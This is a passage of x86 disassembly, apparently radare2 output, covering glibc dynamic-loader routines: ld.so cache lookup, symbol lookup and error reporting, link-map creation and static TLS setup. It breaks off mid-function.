mov eax, dword [0x80aaa08]
cmp eax, 0x10
mov dword [var_48h], eax
jbe 0x807dddc
mov edx, str.ld.so_1.7.0
mov eax, 0xb
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807dddc
mov eax, dword [ebx + 0xc]
mov dword [0x80aaa00], ebx
lea eax, [eax + eax*2]
lea eax, [eax*4 + 0x10]
lea ebx, [eax + ebx]
add eax, 0x30
cmp dword [var_48h], eax
mov dword [0x80aaa04], ebx
jb 0x807ddc2
mov edi, str.glibc_ld.so.cache1.1
mov ecx, 0x14
mov esi, ebx
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807ddcc
mov dword [0x80aaa04], 0xffffffff
mov ecx, dword [0x80aaa00]
test ecx, ecx
jne 0x807d9a7
jmp 0x807de43
cmp ebx, 0xffffffff
je 0x807de1e
cmp dword [var_48h], 0x30
jbe 0x807de0a
mov edx, str.glibc_ld.so.cache1.1
mov eax, 0x14
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807de0a
mov dword [0x80aaa04], ebx
mov dword [0x80aaa00], ebx
jmp 0x807ddcc
cmp ebx, 0xffffffff
je 0x807de1e
mov eax, dword [var_48h]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0xffffffff
jmp 0x807ddcc
mov dword [var_4h], str._etc_ld.so.cache
mov dword [esp], str._search_cache_s_n
call fcn.08081c40
jmp 0x807d999
mov dword [var_ch], str._dl_load_cache_lookup
mov dword [var_8h], 0xeb
mov dword [var_4h], str..._sysdeps_generic_dl_cache.c
mov dword [esp], str.cache_____void__0_
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [0x80aaa00]
test edx, edx
je 0x807dea0
cmp edx, 0xffffffff
je 0x807dea0
mov eax, dword [0x80aaa08]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [esp], ebx
mov dword [var_4h], esi
mov edx, dword [arg_8h]
movzx ecx, byte [edx]
test ecx, ecx
je 0x807df2d
mov eax, ecx
movzx ecx, byte [edx + 1]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 2]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 3]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 4]
jecxz 0x807df2d
shl eax, 4
add edx, 5
add eax, ecx
movzx ecx, byte [edx]
jecxz 0x807df2d
shl eax, 4
mov esi, 0xf0000000
inc edx
add eax, ecx
and esi, eax
and eax, 0xfffffff
shr esi, 0x18
movzx ecx, byte [edx]
xor eax, esi
test ecx, ecx
jne 0x807df0f
mov esi, dword [var_4h]
mov ebx, dword [esp]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edx, dword [arg_20h]
mov eax, dword [arg_18h]
mov ecx, dword [eax]
mov dword [var_10h], edx
mov eax, dword [eax + 4]
mov dword [var_14h], ecx
mov dword [var_18h], eax
lea esi, [esi]
mov edx, dword [var_14h]
mov eax, dword [arg_1ch]
mov dword [var_28h], 0
mov dword [var_2ch], 0
mov edi, dword [edx + eax*4]
mov edx, dword [arg_28h]
test edx, edx
je 0x807df83
cmp edi, dword [var_1ch]
je 0x807df97
test byte [arg_2ch], 2
je 0x807dfae
movzx eax, byte [edi + 0x174]
and eax, 3
test al, al
jne 0x807dfae
inc dword [arg_1ch]
mov eax, dword [var_18h]
cmp dword [arg_1ch], eax
jb 0x807df60
xor edx, edx
add esp, 0x34
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
test byte [0x80aac10], 8
jne 0x807e1fb
mov eax, dword [edi + 0x30]
xor edx, edx
mov eax, dword [eax + 4]
mov dword [var_1ch], eax
mov eax, dword [edi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_20h], eax
mov eax, dword [edi + 0x18c]
mov dword [var_24h], eax
mov eax, dword [arg_ch]
div dword [edi + 0x164]
mov eax, dword [edi + 0x168]
mov esi, dword [eax + edx*4]
test esi, esi
je 0x807e02b
mov esi, esi
mov ebx, dword [var_1ch]
mov eax, esi
shl eax, 4
add ebx, eax
mov eax, dword [ebx + 4]
test eax, eax
jne 0x807e0ac
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 6
je 0x807e0ac
mov eax, dword [edi + 0x16c]
mov esi, dword [eax + esi*4]
test esi, esi
jne 0x807dff0
cmp dword [var_28h], 1
mov ebx, dword [var_2ch]
je 0x807e02d
xor ebx, ebx
test ebx, ebx
je 0x807e045
movzx eax, byte [ebx + 0xc]
shr al, 4
movzx eax, al
cmp eax, 1
je 0x807e08a
cmp eax, 2
je 0x807e080
test esi, esi
jne 0x807df97
mov eax, dword [var_10h]
test eax, eax
je 0x807df97
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807df97
mov edx, edi
call fcn.08081cd0
mov edx, 0xffffffff
test eax, eax
je 0x807df97
jmp 0x807dfa4
nop
mov ecx, dword [0x80aac48]
test ecx, ecx
jne 0x807e09c
mov edx, dword [arg_14h]
mov dword [edx], ebx
mov dword [edx + 4], edi
mov edx, 1
jmp 0x807dfa4
mov eax, dword [arg_14h]
mov edx, dword [eax]
test edx, edx
jne 0x807e045
mov dword [eax], ebx
mov dword [eax + 4], edi
jmp 0x807e045
cmp word [ebx + 0xe], 0
jne 0x807e0bd
test byte [var_18h], 1
jne 0x807e015
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 2
jle 0x807e0d2
cmp eax, 6
jne 0x807e015
cmp ebx, dword [arg_10h]
je 0x807e0f3
mov eax, dword [var_20h_2]
mov edx, dword [var_4h]
add eax, dword [ebx]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e015
mov eax, dword [var_10h]
test eax, eax
je 0x807e1a6
mov eax, dword [var_24h]
test eax, eax
je 0x807e184
mov edx, dword [var_24h_2]
mov ecx, dword [var_10h_2]
movzx eax, word [edx + esi*2]
mov edx, dword [edi + 0x17c]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [var_30h], eax
mov eax, dword [ecx + 4]
mov ecx, dword [var_30h]
cmp dword [edx + ecx + 4], eax
je 0x807e164
mov eax, dword [var_10h_2]
mov eax, dword [eax + 8]
test eax, eax
jne 0x807e015
mov eax, dword [edi + 0x17c]
mov edx, dword [var_30h]
mov eax, dword [eax + edx + 4]
test eax, eax
jne 0x807e015
mov ecx, dword [var_24h_2]
cmp word [ecx + esi*2], 0
js 0x807e015
jmp 0x807e031
mov ecx, dword [var_10h_2]
mov eax, dword [ecx]
mov ecx, dword [var_30h]
mov dword [var_4h], eax
mov eax, dword [edx + ecx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e12e
jmp 0x807e031
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807e031
mov edx, edi
call fcn.08081cd0
test eax, eax
je 0x807e031
jmp 0x807e226
mov eax, dword [var_24h]
test eax, eax
je 0x807e031
test byte [arg_24h], 2
je 0x807e1e8
mov eax, dword [var_24h]
movzx edx, word [eax + esi*2]
mov eax, edx
and eax, 0x7fff
dec eax
jle 0x807e031
test dx, dx
js 0x807e015
inc dword [var_28h]
cmp dword [var_28h], 1
cmovne ebx, dword [var_2ch]
mov dword [var_2ch], ebx
jmp 0x807e015
mov ecx, dword [var_24h]
movzx edx, word [ecx + esi*2]
mov eax, edx
and eax, 0x7fff
cmp eax, 2
jmp 0x807e1c6
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807e20a
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov ecx, dword [var_4h]
mov dword [var_8h], eax
mov dword [esp], str.symbol_s___lookup_in_file_s_n
mov dword [var_4h], ecx
call fcn.08081c40
jmp 0x807dfbb
mov dword [var_ch], str.do_lookup_x
mov dword [var_8h], 0x6d
mov dword [var_4h], str.do_lookup.h
mov dword [esp], str.version__filename____void__0______dl_name_match_p__version__filename__map_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_bp_8h], esi
mov dword [var_bp_ch], ebx
mov dword [var_bp_4h], edi
mov esi, eax
mov ebx, edx
mov dword [var_10h_2], 0
xor eax, eax
cmp esi, edx
je 0x807e2bf
mov eax, 0
test eax, eax
je 0x807e285
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [esi + 0x170]
test eax, eax
jne 0x807e299
mov eax, dword [ebx + 0x170]
test eax, eax
je 0x807e2a7
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807e2ca
mov eax, 0
test eax, eax
je 0x807e2bc
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [var_10h_2]
mov ebx, dword [var_bp_ch]
mov esi, dword [var_bp_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov edx, dword [ebx + 0x1ec]
test dl, 8
jne 0x807e2a7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807e2f4
inc dword [ebx + 0x170]
or edx, 8
mov dword [ebx + 0x1ec], edx
jmp 0x807e2a7
test byte [esi + 0x1ec], 8
jne 0x807e2e3
mov edi, dword [esi + 0x150]
test edi, edi
je 0x807e321
mov ecx, dword [esi + 0x1d8]
xor edx, edx
mov eax, dword [ecx]
test eax, eax
je 0x807e321
cmp eax, ebx
je 0x807e2a7
inc edx
mov eax, dword [ecx + edx*4]
test eax, eax
jne 0x807e315
mov edi, dword [esi + 0x1e0]
xor edx, edx
mov ecx, dword [esi + 0x1e4]
cmp edx, edi
jae 0x807e341
cmp dword [ecx + edx*4], ebx
je 0x807e2a7
inc edx
cmp edx, edi
jb 0x807e333
mov eax, dword [0x80aac58]
test eax, eax
je 0x807e444
cmp eax, ebx
je 0x807e361
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807e444
cmp eax, ebx
jne 0x807e352
test eax, eax
je 0x807e444
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jae 0x807e3fe
mov eax, dword [esi + 0x1e0]
mov edx, dword [esi + 0x1e4]
mov dword [edx + eax*4], ebx
inc eax
mov dword [esi + 0x1e0], eax
mov ecx, dword [ebx + 0x150]
test ecx, ecx
je 0x807e3e1
inc dword [ebx + 0x170]
test byte [0x80aac10], 0x40
je 0x807e2a7
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x807e3b9
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h_2], eax
mov eax, dword [ebx + 4]
cmp byte [eax], 0
jne 0x807e3cc
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h_2], eax
mov dword [esp], str._nfile_s___needed_by__s__relocation_dependency__n_n
call fcn.08081c40
jmp 0x807e2a7
mov ecx, dword [ebx + 0x1d8]
mov eax, dword [ecx]
test eax, eax
je 0x807e39d
add ecx, 4
inc dword [eax + 0x170]
mov eax, dword [ecx]
test eax, eax
jne 0x807e3ed
jmp 0x807e39d
add eax, 5
mov dword [esp], ecx
mov dword [esi + 0x1dc], eax
shl eax, 2
mov dword [var_4h_2], eax
call fcn.08051220
test eax, eax
je 0x807e433
mov dword [esi + 0x1e4], eax
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jb 0x807e377
jmp 0x807e38d
mov eax, dword [esi + 0x1dc]
sub eax, 5
mov dword [esi + 0x1dc], eax
jmp 0x807e426
mov dword [var_10h_2], 0xffffffff
jmp 0x807e2a7
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x84
mov dword [var_54h], ecx
mov dword [var_50h], edx
mov dword [esp], eax
call fcn.0807dec0
mov ebx, dword [arg_8h]
mov dword [var_58h], eax
mov dword [var_44h], 0
mov dword [var_40h], 0
mov eax, dword [arg_ch]
test eax, eax
jne 0x807e8e6
mov eax, dword [arg_18h]
xor esi, esi
test eax, eax
jne 0x807e89a
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
test edx, edx
mov eax, esi
je 0x807e4ff
mov edx, dword [arg_10h]
mov ecx, dword [arg_18h]
mov dword [var_14h], eax
mov dword [var_24h], edx
mov dword [var_20h], ecx
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_1ch], edx
mov edx, dword [var_54h]
mov dword [var_18h], ecx
mov ecx, dword [var_58h]
mov eax, dword [ebx]
mov dword [var_10h], eax
lea eax, [var_44h]
mov dword [var_sp_ch], eax
mov eax, dword [edx]
mov dword [esp], edi
mov dword [var_4h], ecx
mov dword [var_8h], eax
call fcn.0807df40
test eax, eax
mov ecx, eax
jg 0x807e4ff
jl 0x807e785
add ebx, 4
xor eax, eax
mov edx, dword [ebx]
test edx, edx
jne 0x807e4a3
mov ebx, dword [var_44h]
test ebx, ebx
je 0x807e696
mov ecx, dword [var_54h]
mov dword [var_64h], 0
mov edx, dword [ecx]
test edx, edx
je 0x807e52a
movzx eax, byte [edx + 0xd]
and eax, 3
cmp eax, 3
je 0x807e5d9
mov edx, dword [var_40h]
movzx eax, byte [edx + 0x174]
and eax, 3
cmp al, 2
je 0x807e590
test dword [0x80aac10], 0x204
jne 0x807e55c
mov eax, dword [var_44h]
mov edx, dword [var_54h]
mov dword [edx], eax
mov eax, dword [var_40h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0x14
mov ecx, dword [var_64h]
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_10h], ecx
mov dword [var_sp_ch], eax
lea ecx, [var_44h]
mov eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov edx, dword [var_50h]
mov ecx, dword [var_54h]
mov dword [esp], eax
mov eax, edi
call fcn.0807e950
sub esp, 0x14
jmp 0x807e547
test byte [arg_14h], 1
je 0x807e53b
mov eax, dword [var_50h]
call fcn.0807e250
test eax, eax
jns 0x807e53b
mov edx, dword [arg_14h]
mov eax, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_sp_ch], edx
mov dword [var_10h], eax
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
mov dword [var_8h], ecx
mov ecx, dword [var_54h]
mov dword [esp], edx
mov edx, dword [var_50h]
mov dword [var_4h], eax
mov eax, edi
call fcn.0807e450
sub esp, 0x14
jmp 0x807e552
cmp dword [arg_10h], 1
mov dword [var_64h], 1
je 0x807e67f
mov ebx, dword [arg_8h]
mov dword [var_4ch], 0
mov dword [var_48h], 0
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov eax, dword [arg_18h]
mov ecx, dword [arg_14h]
mov dword [var_24h], 1
mov dword [var_14h], esi
mov dword [var_20h], eax
mov dword [var_1ch], ecx
mov eax, dword [arg_ch]
lea ecx, [var_4ch]
mov dword [var_18h], eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_sp_ch], ecx
mov dword [var_8h], edx
mov dword [var_10h], eax
mov eax, dword [var_58h]
mov dword [var_4h], eax
call fcn.0807df40
test eax, eax
jne 0x807e658
add ebx, 4
xor esi, esi
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov ecx, dword [var_54h]
mov edx, dword [ecx]
jmp 0x807e601
mov eax, dword [var_4ch]
test eax, eax
je 0x807e52a
mov edx, dword [var_50h]
cmp dword [var_48h], edx
je 0x807e52a
mov ecx, dword [var_54h]
mov dword [var_40h], edx
mov eax, dword [ecx]
mov dword [var_44h], eax
jmp 0x807e52a
mov eax, dword [var_50h]
cmp dword [var_40h], eax
je 0x807e52a
mov dword [var_44h], edx
mov dword [var_40h], eax
jmp 0x807e52a
mov edx, dword [var_54h]
mov eax, dword [edx]
test eax, eax
je 0x807e6aa
movzx eax, byte [eax + 0xc]
shr al, 4
cmp al, 2
je 0x807e6b1
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x807e6c1
mov edx, dword [var_54h]
mov dword [edx], 0
xor eax, eax
jmp 0x807e552
mov edx, dword [var_50h]
mov dword [var_60h], 0x80a4f11
test edx, edx
je 0x807e6d8
mov ecx, dword [var_50h]
mov ecx, dword [ecx + 4]
mov dword [var_60h], ecx
mov eax, dword [arg_ch]
mov edx, str.__version_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
je 0x807e6f5
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
test eax, eax
jne 0x807e6fa
mov eax, 0x80a4f11
mov dword [var_3ch], str.undefined_symbol:_
mov dword [var_38h], edi
mov dword [var_34h], edx
mov dword [var_30h], eax
mov esi, 1
xor ebx, ebx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 3
jbe 0x807e711
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 3
mov edx, eax
jbe 0x807e738
mov eax, dword [var_60h]
cmp byte [eax], 0
jne 0x807e780
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov ecx, str.symbol_lookup_error
xor eax, eax
mov dword [esp], esi
call fcn.08081380
sub esp, 4
jmp 0x807e6b1
mov edx, dword [var_60h]
jmp 0x807e769
mov eax, dword [arg_18h]
test eax, eax
jne 0x807e4f4
mov esi, dword [arg_ch]
test esi, esi
je 0x807e876
mov ebx, dword [var_50h]
mov dword [var_5ch], 0
test ebx, ebx
je 0x807e7b2
mov eax, dword [var_50h]
mov eax, dword [eax + 4]
mov dword [var_5ch], eax
mov edx, dword [arg_ch]
mov dword [var_2ch], str.symbol_
mov dword [var_28h], edi
mov dword [var_bp_24h], str.__version_
cmp ecx, 0xfffffffe
mov esi, 1
mov eax, dword [edx]
mov dword [var_bp_1ch], str._not_defined_in_file_
mov dword [var_bp_20h], eax
mov eax, dword [edx + 0xc]
mov edx, str.__no_version_symbols_
mov dword [var_bp_14h], str._with_link_time_reference
mov dword [var_bp_18h], eax
mov eax, 0x80a4f11
cmovne edx, eax
xor ebx, ebx
mov dword [var_bp_10h], edx
mov eax, dword [ebp + ebx*4 - 0x2c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 7
jbe 0x807e7f9
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x2c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 7
mov edx, eax
jbe 0x807e820
mov ecx, dword [var_5ch]
cmp byte [ecx], 0
jne 0x807e871
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
xor eax, eax
mov ecx, str.relocation_error
mov dword [esp], esi
call fcn.08081380
mov eax, dword [var_54h]
sub esp, 4
mov dword [eax], 0
jmp 0x807e6ba
mov edx, dword [var_5ch]
jmp 0x807e851
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0x100
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version_____void__0_
call fcn.0805efc0
mov eax, dword [arg_8h]
mov ecx, dword [arg_18h]
mov edx, dword [eax]
mov eax, dword [edx]
mov dword [var_68h], edx
cmp dword [eax], ecx
je 0x807e8b9
nop
lea esi, [esi]
inc esi
mov ecx, dword [arg_18h]
cmp dword [eax + esi*4], ecx
jne 0x807e8b0
mov eax, dword [var_68h]
cmp esi, dword [eax + 4]
jb 0x807e49d
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.i____scope___r_nlist
jmp 0x807e895
mov eax, dword [arg_14h]
test eax, eax
je 0x807e48b
cmp dword [arg_14h], 1
je 0x807e48b
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xe7
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version____void__0___flags__0__flags__DL_LOOKUP_ADD_DEPENDENCY
jmp 0x807e895
nop
push ebp
mov ecx, eax
mov eax, dword [eax + 0x28]
mov ebp, esp
test eax, eax
je 0x807e949
mov eax, dword [eax + 4]
mov edx, dword [eax]
add eax, 8
mov dword [ecx + 0x168], eax
lea eax, [eax + edx*4]
mov dword [ecx + 0x164], edx
mov dword [ecx + 0x16c], eax
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
test byte [0x80aac10], 4
mov dword [var_4h], ebx
mov ecx, dword [edx + 4]
mov ebx, dword [arg_10h]
je 0x807e9d7
mov dword [var_10h], eax
mov edx, str.protected
mov eax, dword [arg_18h]
test eax, eax
mov eax, str.normal
cmove edx, eax
mov eax, dword [arg_ch]
mov dword [var_ch], edx
mov eax, dword [eax + 4]
mov eax, dword [eax + 4]
cmp byte [eax], 0
jne 0x807e997
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
cmp byte [ecx], 0
jne 0x807e9ec
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov dword [var_sp_4h], edx
mov dword [esp], str.binding_file__s_to__s:__s_symbol___s
call fcn.08081c40
test ebx, ebx
je 0x807e9de
mov eax, dword [ebx]
mov dword [esp], str.___s__n
mov dword [var_sp_4h], eax
call fcn.08081c70
mov ebx, dword [var_4h]
leave
ret 0x14
mov dword [esp], 0x809302e
call fcn.08081c70
jmp 0x807e9d7
mov edx, ecx
jmp 0x807e9b1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov esi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [esp], edx
mov dword [var_10h], eax
call fcn.08053400
mov dword [var_4h], 1
lea edx, [eax + 1]
add eax, 0x241
mov dword [var_1ch], edx
mov dword [esp], eax
call fcn.08051730
mov edi, eax
xor eax, eax
test edi, edi
je 0x807ec09
mov edx, dword [var_1ch]
lea ebx, [edi + 0x234]
lea eax, [edi + 0x240]
mov dword [edi + 0x14], ebx
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [var_14h]
mov dword [var_4h], edx
call fcn.08053770
xor ecx, ecx
mov dword [edi + 0x234], eax
mov dword [ebx + 8], 1
movzx edx, byte [var_18h]
mov eax, dword [var_10h]
mov dword [edi + 0x160], esi
mov dword [edi + 0x1b0], 4
mov dword [edi + 4], eax
and edx, 3
movzx eax, byte [edi + 0x174]
and eax, 0xfffffffc
or eax, edx
lea edx, [edi + 0x1a0]
mov byte [edi + 0x174], al
mov dword [edi + 0x1b4], edx
mov eax, dword [0x80aac58]
test eax, eax
je 0x807ec40
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807ead9
lea esi, [esi]
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
jne 0x807ead0
mov eax, dword [0x80aac58]
mov dword [edi + 0x10], edx
mov dword [edx + 0xc], edi
mov edx, dword [edi + 0x1b4]
add eax, 0x150
mov dword [edx + ecx*4], eax
mov ecx, 1
inc dword [0x80aabf8]
add dword [0x80aac18], 1
adc dword [0x80aac1c], 0
test esi, esi
je 0x807ec34
mov eax, dword [esi + 0x160]
test eax, eax
je 0x807eb2c
lea esi, [esi]
mov esi, eax
mov eax, dword [eax + 0x160]
test eax, eax
jne 0x807eb20
test ecx, ecx
lea eax, [esi + 0x150]
je 0x807eb3a
cmp eax, dword [edx]
je 0x807eb3d
mov dword [edx + ecx*4], eax
mov edx, dword [var_10h]
lea eax, [edi + 0x150]
mov dword [edi + 0x1b8], eax
movzx ebx, byte [edx]
test bl, bl
je 0x807ec07
mov dword [esp], edx
call fcn.08053400
inc eax
cmp bl, 0x2f
mov dword [var_20h], eax
je 0x807ec22
mov ebx, dword [var_20h]
mov dword [var_24h], 0
xor esi, esi
sub ebx, 0xffffff80
mov dword [esp], esi
mov dword [var_4h], ebx
call fcn.08051220
test eax, eax
je 0x807ebaf
mov esi, eax
mov eax, ebx
sub eax, dword [var_20h]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08079700
test eax, eax
mov dword [var_24h], eax
jne 0x807ebb6
call fcn.08048b20
cmp dword [eax], 0x22
je 0x807eb78
mov eax, dword [var_24h]
test eax, eax
je 0x807ec13
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.08076ce0
cmp byte [eax - 1], 0x2f
mov edx, eax
je 0x807ebd2
mov byte [eax], 0x2f
inc edx
mov eax, dword [var_20h]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.08053740
mov edx, eax
lea esi, [esi]
dec edx
cmp byte [edx], 0x2f
jne 0x807ebf0
lea eax, [esi + 1]
cmp edx, esi
cmove edx, eax
mov byte [edx], 0
mov dword [edi + 0x190], esi
mov eax, edi
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret 4
mov dword [esp], esi
call fcn.08051180
mov esi, 0xffffffff
jmp 0x807ec01
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
mov edx, eax
jne 0x807ebd2
jmp 0x807ec1b
mov esi, edi
jmp 0x807eb2c
nop
lea esi, [esi]
mov dword [0x80aac58], edi
jmp 0x807eaf7
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov esi, dword [eax + 0x21c]
mov ebx, eax
cmp esi, dword [0x80aabd4]
ja 0x807ed0e
mov edx, dword [0x80aabd0]
mov eax, dword [0x80a95a4]
mov edi, dword [ebx + 0x220]
sub eax, edx
mov dword [var_sp_4h], edx
lea ecx, [eax - 0x420]
mov eax, dword [ebx + 0x218]
add eax, edi
cmp ecx, eax
jb 0x807ed0e
mov edx, ecx
sub edx, eax
mov eax, edx
xor edx, edx
div esi
imul eax, esi
sub ecx, eax
mov eax, dword [var_sp_4h]
sub ecx, edi
add eax, ecx
test byte [ebx + 0x174], 4
mov dword [0x80aabd0], eax
mov dword [ebx + 0x224], eax
jne 0x807ed03
or byte [ebx + 0x175], 4
mov ebx, dword [var_sp_8h]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
mov dword [esp], ebx
call dword [0x80a95bc]
jmp 0x807ecf8
mov edx, dword [ebx + 4]
xor ecx, ecx
xor eax, eax
mov dword [esp], str.cannot_allocate_memory_in_static_TLS_block
call fcn.08081200
jmp 0x807ed30
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov edx, dword [var_8h_2]
mov dword [var_8h_3], ebx
mov dword [var_4h_2], esi
mov ebx, dword gs:[8]
sub ebx, dword [edx + 0x224]
mov ecx, dword gs:[4]
mov eax, dword [edx + 0x228]
mov dword [ecx + eax*4], ebx
mov eax, dword [edx + 0x214]
mov esi, dword [edx + 0x218]
mov dword [var_sp_8h], eax
sub esi, eax
mov eax, dword [edx + 0x210]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.08053740
mov dword [var_sp_4h], 0
mov dword [var_sp_8h], esi
mov dword [esp], eax
call fcn.080536f0
mov ebx, dword [var_8h_3]
mov esi, dword [var_4h_2]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
lea eax, [arg_8h]
push ebx
sub esp, 0xdc
mov esi, dword [arg_8h]
mov dword [var_68h], 0
mov dword [var_14h], eax
test byte [esi + 0x174], 4
jne 0x807f1e5
mov eax, dword [arg_14h]
test eax, eax
jne 0x807ede1
mov eax, dword [esi + 0x78]
mov edx, 0
test eax, eax
cmove edx, dword [var_10h_2]
mov dword [var_10h_2], edx
test byte [0x80aac10], 0x20
jne 0x8080066
mov eax, dword [esi + 0x70]
test eax, eax
jne 0x807ffa9
mov eax, dword [esi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_10h], eax
mov eax, dword [esi + 0x74]
test eax, eax
je 0x807ee43
mov eax, dword [var_10h_2]
test eax, eax
je 0x807ee43
mov eax, dword [esi + 0x24]
mov edx, dword [eax + 4]
mov eax, dword [edx + 4]
test eax, eax
je 0x807ee2e
add eax, dword [esi]
mov dword [esi + 0x1f8], eax
lea eax, [edx + 0xc]
mov dword [esi + 0x1fc], eax
mov dword [edx + 4], esi
mov edi, dword [var_14h_2]
test edi, edi
jne 0x807ff84
mov dword [edx + 8], 0x8081190
mov eax, dword [esi + 0x5c]
mov dword [var_2ch], 0
mov dword [var_24h], 0
mov dword [var_30h], 0
mov dword [var_34h], 0
test eax, eax
je 0x807ee75
mov eax, dword [eax + 4]
mov dword [var_34h_2], eax
mov eax, dword [esi + 0x60]
